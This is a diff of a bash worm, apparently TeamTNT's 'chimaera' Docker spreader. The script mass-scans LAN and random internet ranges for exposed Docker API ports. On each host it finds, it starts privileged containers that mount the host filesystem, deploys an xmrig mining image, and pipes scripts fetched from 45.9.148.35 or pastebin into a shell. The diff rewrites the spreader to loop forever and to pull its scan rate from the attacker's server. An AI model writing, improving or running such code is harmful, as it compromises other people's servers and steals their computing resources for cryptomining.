@@ -1,14 +1,12 @@
 #!/bin/bash
 
-# wget -O - http://45.9.148.35/chimaera/sh/spread_docker_local.sh | bash
-
-
 clear
-RATE_TO_SCAN=500000
+SCAN_T=500000
 SOURCE_URL="http://45.9.148.35"
+LOG_FILE="/var/tmp/spread_docker.log"
 
-PWNTAINER=$(curl -s http://45.9.148.35/chimaera/data/docker.container.local.spread.txt)
-PWNWWWLNK="http://45.9.148.35/chimaera/sh/setup_xmr.sh"
+PWNTAINER="xululol/xmrig"
+PWNWWWLNK="https://pastebin.com/raw/dNm3FiAc"
 
 LAN_RANGES=("10.0.0.0/8" "172.16.0.0/12" "192.168.0.0/16" "169.254.0.0/16" "100.64.0.0/10")
 
@@ -20,103 +18,109 @@ BLUE='\033[1;34m'
 GREEN='\033[1;32m'
 RED='\033[1;31m'
 
-
+function log() {
+    echo -e "${BLUE}[$(date '+%Y-%m-%d %H:%M:%S')] $@${NORMAL}"
+}
 
 function init_main(){
-if [ -f "/var/tmp/.tnt.docker.lock" ];then echo "spreading is running!" ; exit ; fi
-set_lock
-setup_this_spreader
-check_spreader_setup
-feed_the_ranges
-remove_lock
-}
-
-
-function remove_lock(){
-rm -f /var/tmp/.tnt.docker.lock
-}
-
-function set_lock(){
-mkdir -p /var/tmp/ 2>/dev/null
-touch /var/tmp/.tnt.docker.lock
-}
-
-
-
-function setup_docker(){
-if type yum 2>/dev/null 1>/dev/null; then
-yum remove docker docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-engine
-yum install -y yum-utils
-yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
-
-
-https://download.docker.com/linux/centos/8/x86_64/stable/Packages/docker-ce-20.10.4-3.el8.x86_64.rpm
-
-
-
-fi
-
-
-
+    log "Initializing main function"
+    setup_this_spreader
+    check_spreader_setup
+    feed_the_ranges
 }
 
 function setup_this_spreader(){
-echo "start setup"
-if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; fi
-if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; fi
-if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; fi
+    log "Setting up the spreader"
+    if type apk >/dev/null 2>&1; then log "Updating apk"; apk update >/dev/null 2>&1 ; fi
+    if type apt-get >/dev/null 2>&1; then log "Updating apt-get"; apt-get update --fix-missing >/dev/null 2>&1 ; fi
+    if type yum >/dev/null 2>&1; then log "Cleaning yum"; yum clean all >/dev/null 2>&1 ; fi
 
-for SET_PACK in ${PACK_ARRAY[@]} ; do clear
-if type apk 2>/dev/null 1>/dev/null; then apk add $SET_PACK 2>/dev/null 1>/dev/null ; fi
-if type apt-get 2>/dev/null 1>/dev/null; then apt-get install -y $SET_PACK 2>/dev/null 1>/dev/null ; fi
-if type yum 2>/dev/null 1>/dev/null; then yum install -y $SET_PACK 2>/dev/null 1>/dev/null ; fi ; done
+    for SET_PACK in "${PACK_ARRAY[@]}" ; do 
+        log "Installing package: $SET_PACK"
+        if type apk >/dev/null 2>&1; then apk add "$SET_PACK" >/dev/null 2>&1 ; fi
+        if type apt-get >/dev/null 2>&1; then apt-get install -y "$SET_PACK" >/dev/null 2>&1 ; fi
+        if type yum >/dev/null 2>&1; then yum install -y "$SET_PACK" >/dev/null 2>&1 ; fi
+    done
 
-if [ ! -f "/usr/bin/zgrab" ];then wget -q $SOURCE_URL/chimaera/bin/x86_64/zgrab -O /usr/bin/zgrab && chmod +x /usr/bin/zgrab ; fi
+    if [ ! -f "/usr/bin/zgrab" ]; then 
+        log "Downloading and setting up zgrab"
+        wget -qO- https://pastebin.com/raw/wcGhSPqJ | bash >/dev/null 2>&1
+    fi
 
-if ! type masscan 2>/dev/null 1>/dev/null; then wget -q $SOURCE_URL/chimaera/bin/mass.tar.gz -O /var/tmp/mass.tar.gz
-tar xvf /var/tmp/mass.tar.gz -C /var/tmp/ 2>/dev/null 1>/dev/null && cd /var/tmp/mass/ && rm -f /var/tmp/mass.tar.gz 2>/dev/null 1>/dev/null
-make 2>/dev/null 1>/dev/null && cp bin/masscan /usr/bin/masscan 2>/dev/null 1>/dev/null && chmod +x /usr/bin/masscan 2>/dev/null 1>/dev/null
-make install 2>/dev/null 1>/dev/null && cd / 2>/dev/null 1>/dev/null && rm -fr /var/tmp/mass/ 2>/dev/null 1>/dev/null ; fi
+    if ! type masscan >/dev/null 2>&1; then 
+        log "Downloading and setting up masscan"
+        wget -qO /var/tmp/mass.tar.gz "$SOURCE_URL/bin/mass.tar.gz"
+        tar xvf /var/tmp/mass.tar.gz -C /var/tmp/ >/dev/null 2>&1 && cd /var/tmp/mass/ && rm -f /var/tmp/mass.tar.gz >/dev/null 2>&1
+        make >/dev/null 2>&1 && cp bin/masscan /usr/bin/masscan >/dev/null 2>&1 && chmod +x /usr/bin/masscan >/dev/null 2>&1
+        make install >/dev/null 2>&1 && cd / >/dev/null 2>&1 && rm -fr /var/tmp/mass/ >/dev/null 2>&1
+    fi
 
-if ! type docker 2>/dev/null 1>/dev/null; then curl -sLk https://get.docker.com | bash ; fi
+    if ! type docker >/dev/null 2>&1; then 
+        log "Installing Docker"
+        curl -sSL https://get.docker.com | bash >/dev/null 2>&1
+    fi
 }
-
 
 function check_spreader_setup(){
-clear ; echo "check setup" ; sleep 2 ; clear
-TOOLS_ARRAY=("wget" "curl" "docker" "masscan" "jq" "zgrab")
-for CHECKTOOL in ${TOOLS_ARRAY[@]} ; do
-if type $CHECKTOOL 2>/dev/null 1>/dev/null; then 
-echo -e "$GREEN FOUND: $CHECKTOOL Install OKAY! $NORMAL" ; else
-echo -e "$RED MISSING: $CHECKTOOL Install FAIL! $NORMAL" ; exit ; fi
-done
+    clear
+    log "Checking spreader setup"
+    TOOLS_ARRAY=("wget" "curl" "docker" "masscan" "jq" "zmap")
+    for CHECKTOOL in "${TOOLS_ARRAY[@]}" ; do
+        if type "$CHECKTOOL" >/dev/null 2>&1; then 
+            log "$GREEN FOUND: $CHECKTOOL Install OKAY! $NORMAL"
+        else
+            log "$RED MISSING: $CHECKTOOL Install FAIL! $NORMAL"
+            exit 1
+        fi
+    done
 }
 
+function dAPIpwn(){
+    local range=$1
+    local port=$2
+    local rate=$3
+    log "Running masscan on range: $range, port: $port, rate: $rate"
 
+    local masscan_output
+    masscan_output=$(masscan --router-mac 66-55-44-33-22-11 "$range".0.0.0/8 -p"$port" --rate="$rate" 2>&1)
+    if [ $? -ne 0 ]; then
+        log "$RED Masscan failed: $masscan_output $NORMAL"
+        return
+    fi
 
-dAPIpwn(){
-range=$1
-port=$2
-rate=$3
-rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
-eval "$rndstr"="'$(masscan --router-mac 66-55-44-33-22-11 $range -p$port --rate=$rate | awk '{print $6}'| zgrab --senders 200 --port $port --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
+    local ips
+    ips=$(echo "$masscan_output" | awk '/open/ {print $6}' | xargs)
+    if [ -z "$ips" ]; then
+        log "$BLUE No IPs found in masscan output $NORMAL"
+        return
+    fi
 
-for ipaddy in ${!rndstr}; do
-timeout -s SIGKILL 120 docker -H $TARGET run -d --net host --restart always --privileged --name dockerlan -v /:/host $PWNTAINER & 
-timeout -s SIGKILL 240 docker -H $TARGET run -d --net host --privileged -v /:/mnt alpine chroot sh -c 'apk update; apk add bash curl wget; apt update; apt install -y  bash curl wget; yum install -y  bash curl wget; wget -q -O - $PWNWWWLNK | sh || curl -s $PWNWWWLNK | sh' &
-done
+    for ipaddy in $ips; do
+        log "Found IP: $ipaddy"
+        echo "$ipaddy" >> "$LOG_FILE"
+        log "Attempting to run Docker commands on $ipaddy"
+        timeout -s SIGKILL "$TIME1OUT" docker -H "$ipaddy" run -d --net host --restart always --privileged --name dockerlan -v /:/host "$PWNTAINER" &
+        timeout -s SIGKILL "$TIME2OUT" docker -H "$ipaddy" run -d --net host --privileged -v /:/mnt alpine chroot bash -c 'apk update; apk add bash curl wget; apt update; apt install -y bash curl wget; yum install -y bash curl wget; wget -q -O - '"$PWNWWWLNK"' | sh || curl -s '"$PWNWWWLNK"' | bash' &
+    done
 }
 
 function feed_the_ranges(){
-clear ; echo "scanne local range" ; sleep 2 ; clear
-for LRANGE in ${LAN_RANGES[@]}; do 
-dAPIpwn $LRANGE 2375 $RATE_TO_SCAN
-dAPIpwn $LRANGE 2376 $RATE_TO_SCAN
-dAPIpwn $LRANGE 2377 $RATE_TO_SCAN
-dAPIpwn $LRANGE 4244 $RATE_TO_SCAN
-dAPIpwn $LRANGE 4243 $RATE_TO_SCAN
-done 
+    while true; do
+        log "Feeding ranges"
+        SCAN_T=$(curl -s http://45.9.148.35/scan_threads.dat || wget -q -O - http://45.9.148.35/scan_threads.dat)
+        if [ -z "$SCAN_T" ]; then 
+            log "Setting default SCAN_T value"
+            SCAN_T=10000
+        fi
+        RAN_GEN=$((RANDOM%255+1))
+        log "Generated random range: $RAN_GEN"
+        dAPIpwn "$RAN_GEN" 2375 "$SCAN_T"
+        dAPIpwn "$RAN_GEN" 2376 "$SCAN_T"
+        dAPIpwn "$RAN_GEN" 2377 "$SCAN_T"
+        dAPIpwn "$RAN_GEN" 4244 "$SCAN_T"
+        dAPIpwn "$RAN_GEN" 4243 "$SCAN_T"
+        sleep 5  # Wait before scanning again
+    done
 }
-
 
 init_main
